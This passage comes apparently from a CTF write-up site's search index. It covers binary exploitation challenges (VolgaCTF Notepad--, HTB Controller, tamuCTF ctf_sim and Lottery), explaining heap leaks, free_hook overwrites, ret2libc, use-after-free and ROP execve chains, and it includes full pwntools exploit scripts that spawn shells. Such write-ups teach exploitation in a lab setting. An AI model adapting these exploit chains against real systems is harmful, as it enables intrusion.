pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"pwning/htb_cyber_21/controller/controller/","text":"Controller Description : Solution We were given an elf- controller and a libc On checking the type of file: controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped On doing checksec: [*] '/home/adhi-11/Downloads/control/controller' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) On running it: As it is dynamically linked, and as NX is enabled , we might have to do a ret2libc Let's debug in ghidra: main undefined8 main(void) { setvbuf(stdout,(char *)0x0,2,0); welcome(); calculator(); return 0; } welcome functions seems normal, so let's move on to other's calculator void calculator(void) { ulong uVar1; char local_28 [28]; int local_c; uVar1 = calc(); local_c = (int)uVar1; if (local_c == 0xff3a) { printstr(\"Something odd happened!\\nDo you want to report the problem?\\n> \"); __isoc99_scanf(&DAT_004013e6,local_28); if ((local_28[0] == 'y') || (local_28[0] == 'Y')) { printstr(\"Problem reported!\\n\"); } else { printstr(\"Problem ingored\\n\"); } } else { calculator(); } return; } calc ulong calc(void) { ulong uVar1; float fVar2; uint local_18; uint local_14; int local_10; uint local_c; printstr(\"Insert the amount of 2 different types of recources: \"); __isoc99_scanf(\"%d %d\",&local_14,&local_18); uVar1 = menu(); local_10 = (int)uVar1; if ((69 < (int)local_14) || (0x45 < (int)local_18)) { printstr(\"We cannot use these many resources at once!\\n\"); /* WARNING: Subroutine does not return */ exit(0x69); } if (local_10 == 2) { uVar1 = sub(local_14,local_18); local_c = (uint)uVar1; printf(\"%d - %d = %d\\n\",(ulong)local_14,(ulong)local_18,uVar1 & 0xffffffff); goto LAB_00401061; } if (local_10 < 3) { if (local_10 == 1) { uVar1 = add(local_14,local_18); local_c = (uint)uVar1; printf(\"%d + %d = %d\\n\",(ulong)local_14,(ulong)local_18,uVar1 & 0xffffffff); goto LAB_00401061; } } else { if (local_10 == 3) { uVar1 = mult(local_14,local_18); local_c = (uint)uVar1 & 0xffff; printf(\"%d * %d = %d\\n\",(ulong)local_14,(ulong)local_18,(ulong)local_c); goto LAB_00401061; } if (local_10 == 4) { fVar2 = divi(local_14,local_18); local_c = (uint)(long)fVar2; printf(\"%d / %d = %d\\n\",(ulong)local_14,(ulong)local_18,(long)fVar2 & 0xffffffff); goto LAB_00401061; } } printstr(\"Invalid operation, exiting..\\n\"); LAB_00401061: return (ulong)local_c; } OVERFLOW From calculator(), we understood that our inputs(say, a and b) must be in such a way that on doing any of the above operations on it, should give us 0xff3a (65338). Once we can do that, we will get to \" __isoc99_scanf(&DAT_004013e6,local_28);\", which is gets as \"%s\" is unbound. Then we can overflow char local_28 [28] In calc(): ((69 < (int)local_14) || (0x45 < (int)local_18)), this condition says if our input is greater than 65, i will show an error statment. Inputs : -65338 and -130676 p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') Now we got to scanf, to overflow we need to give a junk input of size 40 (32 + 8 padding). LEAK As ASLR,that is in simple terms randomization of base address in libc, might be enabled, we have to leak the libc address. Let's leak puts() address from GOT. Here, the first argument(address) is to be pooped into RDI. The code to leak: ppop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi leak = 40 * b'A' # our overflow value with padding : 32+8 leak += p64(pop_rdi) leak += p64(binary.got.puts) leak += p64(binary.plt.puts) leak += p64(binary.sym.calculator) p.sendlineafter('> ',leak) p.recvuntil('ingored\\n') address= u64(p.recv(6) + b'\\0\\0') log.info('puts: ' + hex(address)) libc.address = puts - libc.sym.puts log.info('libc.address: ' + hex(libc.ddress)) RET2LIBC Now that we have our addresses, we have to do a basic ret2libc. We have to overflow again and pop the address of \"/bin/sh\" in RDI . payload = 40 * b'A' payload += p64(pop_rdi+1) payload += p64(pop_rdi) payload += p64(libc.search(b\"/bin/sh\").__next__()) payload += p64(libc.sym.system) Final Script from pwn import * # As, I am running locally, I use this. Else you can connect it to server. binary = context.binary = ELF('./controller') p = process(binary.path) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # Sening our inputs acc to condition. p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') pop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi leak = 40 * b'A' # our overflow value with padding : 32+8 leak += p64(pop_rdi) leak += p64(binary.got.puts) leak += p64(binary.plt.puts) leak += p64(binary.sym.calculator) p.sendlineafter('> ',leak) p.recvuntil('ingored\\n') puts= u64(p.recv(6) + b'\\0\\0') #log.info('puts: ' + hex(aputs) libc.address = puts - libc.sym.puts #log.info('libc.address: ' + hex(libc.ddress)) p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') payload = 40 * b'A' payload += p64(pop_rdi+1) payload += p64(pop_rdi) payload += p64(libc.search(b\"/bin/sh\").__next__()) payload += p64(libc.sym.system) p.sendlineafter('> ',payload) p.recvuntil('ingored\\n') p.interactive() FLAG CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}","title":"Controller"},{"location":"pwning/htb_cyber_21/controller/controller/#controller","text":"","title":"Controller"},{"location":"pwning/htb_cyber_21/controller/controller/#description","text":"","title":"Description :"},{"location":"pwning/htb_cyber_21/controller/controller/#solution","text":"We were given an elf- controller and a libc On checking the type of file: controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped On doing checksec: [*] '/home/adhi-11/Downloads/control/controller' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) On running it: As it is dynamically linked, and as NX is enabled , we might have to do a ret2libc Let's debug in ghidra: main undefined8 main(void) { setvbuf(stdout,(char *)0x0,2,0); welcome(); calculator(); return 0; } welcome functions seems normal, so let's move on to other's calculator void calculator(void) { ulong uVar1; char local_28 [28]; int local_c; uVar1 = calc(); local_c = (int)uVar1; if (local_c == 0xff3a) { printstr(\"Something odd happened!\\nDo you want to report the problem?\\n> \"); __isoc99_scanf(&DAT_004013e6,local_28); if ((local_28[0] == 'y') || (local_28[0] == 'Y')) { printstr(\"Problem reported!\\n\"); } else { printstr(\"Problem ingored\\n\"); } } else { calculator(); } return; } calc ulong calc(void) { ulong uVar1; float fVar2; uint local_18; uint local_14; int local_10; uint local_c; printstr(\"Insert the amount of 2 different types of recources: \"); __isoc99_scanf(\"%d %d\",&local_14,&local_18); uVar1 = menu(); local_10 = (int)uVar1; if ((69 < (int)local_14) || (0x45 < (int)local_18)) { printstr(\"We cannot use these many resources at once!\\n\"); /* WARNING: Subroutine does not return */ exit(0x69); } if (local_10 == 2) { uVar1 = sub(local_14,local_18); local_c = (uint)uVar1; printf(\"%d - %d = %d\\n\",(ulong)local_14,(ulong)local_18,uVar1 & 0xffffffff); goto LAB_00401061; } if (local_10 < 3) { if (local_10 == 1) { uVar1 = add(local_14,local_18); local_c = (uint)uVar1; printf(\"%d + %d = %d\\n\",(ulong)local_14,(ulong)local_18,uVar1 & 0xffffffff); goto LAB_00401061; } } else { if (local_10 == 3) { uVar1 = mult(local_14,local_18); local_c = (uint)uVar1 & 0xffff; printf(\"%d * %d = %d\\n\",(ulong)local_14,(ulong)local_18,(ulong)local_c); goto LAB_00401061; } if (local_10 == 4) { fVar2 = divi(local_14,local_18); local_c = (uint)(long)fVar2; printf(\"%d / %d = %d\\n\",(ulong)local_14,(ulong)local_18,(long)fVar2 & 0xffffffff); goto LAB_00401061; } } printstr(\"Invalid operation, exiting..\\n\"); LAB_00401061: return (ulong)local_c; }","title":"Solution"},{"location":"pwning/htb_cyber_21/controller/controller/#overflow","text":"From calculator(), we understood that our inputs(say, a and b) must be in such a way that on doing any of the above operations on it, should give us 0xff3a (65338). Once we can do that, we will get to \" __isoc99_scanf(&DAT_004013e6,local_28);\", which is gets as \"%s\" is unbound. Then we can overflow char local_28 [28] In calc(): ((69 < (int)local_14) || (0x45 < (int)local_18)), this condition says if our input is greater than 65, i will show an error statment. Inputs : -65338 and -130676 p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') Now we got to scanf, to overflow we need to give a junk input of size 40 (32 + 8 padding).","title":"OVERFLOW"},{"location":"pwning/htb_cyber_21/controller/controller/#leak","text":"As ASLR,that is in simple terms randomization of base address in libc, might be enabled, we have to leak the libc address. Let's leak puts() address from GOT. Here, the first argument(address) is to be pooped into RDI. The code to leak: ppop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi leak = 40 * b'A' # our overflow value with padding : 32+8 leak += p64(pop_rdi) leak += p64(binary.got.puts) leak += p64(binary.plt.puts) leak += p64(binary.sym.calculator) p.sendlineafter('> ',leak) p.recvuntil('ingored\\n') address= u64(p.recv(6) + b'\\0\\0') log.info('puts: ' + hex(address)) libc.address = puts - libc.sym.puts log.info('libc.address: ' + hex(libc.ddress))","title":"LEAK"},{"location":"pwning/htb_cyber_21/controller/controller/#ret2libc","text":"Now that we have our addresses, we have to do a basic ret2libc. We have to overflow again and pop the address of \"/bin/sh\" in RDI . payload = 40 * b'A' payload += p64(pop_rdi+1) payload += p64(pop_rdi) payload += p64(libc.search(b\"/bin/sh\").__next__()) payload += p64(libc.sym.system)","title":"RET2LIBC"},{"location":"pwning/htb_cyber_21/controller/controller/#final-script","text":"from pwn import * # As, I am running locally, I use this. Else you can connect it to server. binary = context.binary = ELF('./controller') p = process(binary.path) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # Sening our inputs acc to condition. p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') pop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi leak = 40 * b'A' # our overflow value with padding : 32+8 leak += p64(pop_rdi) leak += p64(binary.got.puts) leak += p64(binary.plt.puts) leak += p64(binary.sym.calculator) p.sendlineafter('> ',leak) p.recvuntil('ingored\\n') puts= u64(p.recv(6) + b'\\0\\0') #log.info('puts: ' + hex(aputs) libc.address = puts - libc.sym.puts #log.info('libc.address: ' + hex(libc.ddress)) p.sendlineafter(': ','-65338 -130676') p.sendlineafter('> ','2') payload = 40 * b'A' payload += p64(pop_rdi+1) payload += p64(pop_rdi) payload += p64(libc.search(b\"/bin/sh\").__next__()) payload += p64(libc.sym.system) p.sendlineafter('> ',payload) p.recvuntil('ingored\\n') p.interactive()","title":"Final Script"},{"location":"pwning/htb_cyber_21/controller/controller/#flag","text":"CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}","title":"FLAG"},{"location":"pwning/tamuCTF/ctf_sim/","text":"ctf_sim Points: 356 This was a uaf based challenge that I solved after the CTF. I'll now take you through it. Preliminary analysis: ctf_sim: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2761071c48f75292676a4dabec103db701a4cee3, not stripped Canary : \u2718 NX : \u2713 PIE : \u2718 Fortify : \u2718 RelRO : Partial gef\u27a4 As we can see, only NX bit is enabled, and it is a 64-bit dynamically linked binary. Let us move onto analyzing the binary. As we run the binary, we see 4 options - download challenge, solve challenge, submit writeup for challenge, and exit. CTF SIM 1. Download a Challenge 2. Solve a Challenge 3. Submit a writeup 4. Quit > The following functions: - download challenge() provides us a choice to choose one of the categories, (all the challenges are structures which contain a function), and saves it into a downloaded array, however the maximum index we can reach is 3, which means we can download atmost 3 challenges. - solve challenge() calls the fucntion solve of the structure, and then frees the allocated area of the structure. Libc version used is: ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31 . One thing to notice here is that, we can reuse the same chunk by requesting a chunk of the same size. After freeing it, we can reuse to point to win, thus when the function solve() is called again inside the structure, the pointer to win() will call the win() function instead. This cane be seen from the line: downloaded[index] -> solve(); Hence making use of the UAF bug available. - submit writeup() takes input from the reader. Here, we submit a writeup of 16 bytes, and provide the pointer to win() function as our payload. Thus our process involves: - download a challenge, store it at any index. - solve the challenge download, so as to free the allocated area of the strcture. - submit writeup for the solved challenge, (providing a pointer to win() as the paylaod so that, when solve() function is called again, win() will be called instead.) - solve the same downloaded and freed challenge again, so as to call win() this time. Exploit: def download(cat, ind): p.recv() p.sendline('1') p.sendline(bytes(cat)) p.sendline(bytes(ind)) def solve_chall(ind): p.recv() p.sendline('2') p.sendline(bytes(ind)) def writeup(length, content): p.recv() p.sendline('3') p.sendline(bytes(length)) p.sendline(content) from pwn import * #p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"ctf-sim\") p = process('./ctf_sim') gdb.attach(p) win_ptr = 0x404088 download(1, 1) solve_chall(1) pay = p64(win_ptr) writeup(16, pay) solve_chall(1) p.interactive()","title":"ctf_sim"},{"location":"pwning/tamuCTF/ctf_sim/#ctf_sim","text":"Points: 356 This was a uaf based challenge that I solved after the CTF. I'll now take you through it.","title":"ctf_sim"},{"location":"pwning/tamuCTF/ctf_sim/#preliminary-analysis","text":"ctf_sim: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2761071c48f75292676a4dabec103db701a4cee3, not stripped Canary : \u2718 NX : \u2713 PIE : \u2718 Fortify : \u2718 RelRO : Partial gef\u27a4 As we can see, only NX bit is enabled, and it is a 64-bit dynamically linked binary. Let us move onto analyzing the binary. As we run the binary, we see 4 options - download challenge, solve challenge, submit writeup for challenge, and exit. CTF SIM 1. Download a Challenge 2. Solve a Challenge 3. Submit a writeup 4. Quit > The following functions: - download challenge() provides us a choice to choose one of the categories, (all the challenges are structures which contain a function), and saves it into a downloaded array, however the maximum index we can reach is 3, which means we can download atmost 3 challenges. - solve challenge() calls the fucntion solve of the structure, and then frees the allocated area of the structure. Libc version used is: ldd (Ubuntu GLIBC 2.31-0ubuntu9.7) 2.31 . One thing to notice here is that, we can reuse the same chunk by requesting a chunk of the same size. After freeing it, we can reuse to point to win, thus when the function solve() is called again inside the structure, the pointer to win() will call the win() function instead. This cane be seen from the line: downloaded[index] -> solve(); Hence making use of the UAF bug available. - submit writeup() takes input from the reader. Here, we submit a writeup of 16 bytes, and provide the pointer to win() function as our payload. Thus our process involves: - download a challenge, store it at any index. - solve the challenge download, so as to free the allocated area of the strcture. - submit writeup for the solved challenge, (providing a pointer to win() as the paylaod so that, when solve() function is called again, win() will be called instead.) - solve the same downloaded and freed challenge again, so as to call win() this time.","title":"Preliminary analysis:"},{"location":"pwning/tamuCTF/ctf_sim/#exploit","text":"def download(cat, ind): p.recv() p.sendline('1') p.sendline(bytes(cat)) p.sendline(bytes(ind)) def solve_chall(ind): p.recv() p.sendline('2') p.sendline(bytes(ind)) def writeup(length, content): p.recv() p.sendline('3') p.sendline(bytes(length)) p.sendline(content) from pwn import * #p = remote(\"tamuctf.com\", 443, ssl=True, sni=\"ctf-sim\") p = process('./ctf_sim') gdb.attach(p) win_ptr = 0x404088 download(1, 1) solve_chall(1) pay = p64(win_ptr) writeup(16, pay) solve_chall(1) p.interactive()","title":"Exploit:"},{"location":"pwning/tamuCTF/lottery/","text":"Lottery Description : Attack the binary and get the flag! We can connect with : openssl s_client -connect tamuctf.com:443 -servername lottery -quiet The first thing to do here might be to check for file info. lottery: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped * Since it is statically linked, the possibility of a ret2libc attack is eliminated. * Another look into checksec would reveal that NX is enabled. * With NX enabled, we may not be able to inject a shellcode either. Initially, while running the program, we are prompted with three options, enter numbers, check numbers and enter name. However a look into check_numbers() in gdb reveals that entering the correct numbers is not enough to print the flag. However we can see that ask_name() contains gets. Making use of this vulnerability we can make a syscall. Disasssembly of ask_name : ```0x0000000000401470 <+0>: push rbp 0x0000000000401471 <+1>: xor eax,eax 0x0000000000401473 <+3>: sub rsp,0x40 0x0000000000401477 <+7>: mov rbp,rsp 0x000000000040147a <+10>: mov rdi,rbp 0x000000000040147d <+13>: call 0x401b34 0x0000000000401482 <+18>: mov rsi,rbp 0x0000000000401485 <+21>: lea rdi,[rip+0x7bad] # 0x409039 0x000000000040148c <+28>: xor eax,eax 0x000000000040148e <+30>: call 0x401bd3 0x0000000000401493 <+35>: add rsp,0x40 0x0000000000401497 <+39>: pop rbp 0x0000000000401498 <+40>: ret The buffer size defined is 0x48 bytes, but since gets is used, there is no limit to our input. To do the syscall, we can make use of ROPgadgets and the following code : # Python script : from pwn import * p = remote('localhost', 4444) buf = 'a'*0x48 syscall = p64(0x00000000004016f9) pop_rax = p64(0x000000000040100b) pop_rdi = p64(0x401253) pop_rsi = p64(0x4018ad) pop_rdx = p64(0x0000000000401255) mov_qword_ptr_rdi_rax = p64(0x401f37) buf += pop_rax + p64(0x0068732f6e69622f) + pop_rdi + p64(0x40c730) + mov_qword_ptr_rdi_rax buf += pop_rax + p64(0x3b) buf += pop_rdi + p64(0x40c730) buf += pop_rsi + p64(0x00) + pop_rdx + p64(0x00) + syscall p.recvuntil(\"Action: \") p.sendline('3') p.sendline(buf) p.interactive() ```","title":"Lottery"},{"location":"pwning/tamuCTF/lottery/#lottery","text":"Description : Attack the binary and get the flag! We can connect with : openssl s_client -connect tamuctf.com:443 -servername lottery -quiet The first thing to do here might be to check for file info. lottery: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped * Since it is statically linked, the possibility of a ret2libc attack is eliminated. * Another look into checksec would reveal that NX is enabled. * With NX enabled, we may not be able to inject a shellcode either. Initially, while running the program, we are prompted with three options, enter numbers, check numbers and enter name. However a look into check_numbers() in gdb reveals that entering the correct numbers is not enough to print the flag. However we can see that ask_name() contains gets. Making use of this vulnerability we can make a syscall. Disasssembly of ask_name : ```0x0000000000401470 <+0>: push rbp 0x0000000000401471 <+1>: xor eax,eax 0x0000000000401473 <+3>: sub rsp,0x40 0x0000000000401477 <+7>: mov rbp,rsp 0x000000000040147a <+10>: mov rdi,rbp 0x000000000040147d <+13>: call 0x401b34 0x0000000000401482 <+18>: mov rsi,rbp 0x0000000000401485 <+21>: lea rdi,[rip+0x7bad] # 0x409039 0x000000000040148c <+28>: xor eax,eax 0x000000000040148e <+30>: call 0x401bd3 0x0000000000401493 <+35>: add rsp,0x40 0x0000000000401497 <+39>: pop rbp 0x0000000000401498 <+40>: ret The buffer size defined is 0x48 bytes, but since gets is used, there is no limit to our input. To do the syscall, we can make use of ROPgadgets and the following code : # Python script : from pwn import * p = remote('localhost', 4444) buf = 'a'*0x48 syscall = p64(0x00000000004016f9) pop_rax = p64(0x000000000040100b) pop_rdi = p64(0x401253) pop_rsi = p64(0x4018ad) pop_rdx = p64(0x0000000000401255) mov_qword_ptr_rdi_rax = p64(0x401f37) buf += pop_rax + p64(0x0068732f6e69622f) + pop_rdi + p64(0x40c730) + mov_qword_ptr_rdi_rax buf += pop_rax + p64(0x3b) buf += pop_rdi + p64(0x40c730) buf += pop_rsi + p64(0x00) + 